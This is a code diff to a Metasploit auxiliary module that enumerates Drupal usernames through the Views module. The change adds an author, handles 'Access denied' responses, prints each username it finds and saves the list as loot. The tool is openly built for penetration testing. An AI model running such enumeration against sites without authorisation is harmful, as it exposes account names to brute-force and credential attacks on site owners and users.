@@ -24,7 +24,8 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'         =>
 				[
 					'Justin Klein Keane', #Original Discovery
-					'Robin Francois <rof[at]navixia.com>'
+					'Robin Francois <rof[at]navixia.com>',
+					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
 				],
 			'License'        => MSF_LICENSE,
 			'References'     =>
@@ -49,7 +50,11 @@ class Metasploit3 < Msf::Auxiliary
 
 		if not res
 			return false
-		elsif res.message != 'OK' or res.body != '[  ]'
+		elsif res and res.body =~ /\<title\>Access denied/
+			# This probably means the Views Module actually isn't installed
+			print_error("#{rhost} - Access denied")
+			return false
+		elsif res and res.message != 'OK' or res.body != '[  ]'
 			return false
 		else
 			return true
@@ -71,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		# Check if remote host is available or appears vulnerable
 		if not check(enum_uri)
-			print_status("#{ip} does not appear to be vulnerable, will not continue")
+			print_error("#{ip} does not appear to be vulnerable, will not continue")
 			return
 		end
 
@@ -106,6 +111,8 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Done. " + final_results.length.to_s + " usernames found...")
 
 		final_results.each do |user|
+			print_good("Found User: #{user}")
+
 			report_auth_info(
 				:host => Rex::Socket.getaddress(datastore['RHOST']),
 				:port => datastore['RPORT'],
@@ -113,5 +120,19 @@ class Metasploit3 < Msf::Auxiliary
 				:type => "drupal_user"
 			)
 		end
+
+		# One username per line
+		final_results = final_results * "\n"
+
+		p = store_loot(
+			'drupal_user',
+			'text/plain',
+			Rex::Socket.getaddress(datastore['RHOST']),
+			final_results.to_s,
+			'drupal_user.txt'
+		)
+
+		print_status("Usernames stored in: #{p}")
 	end
+
 end
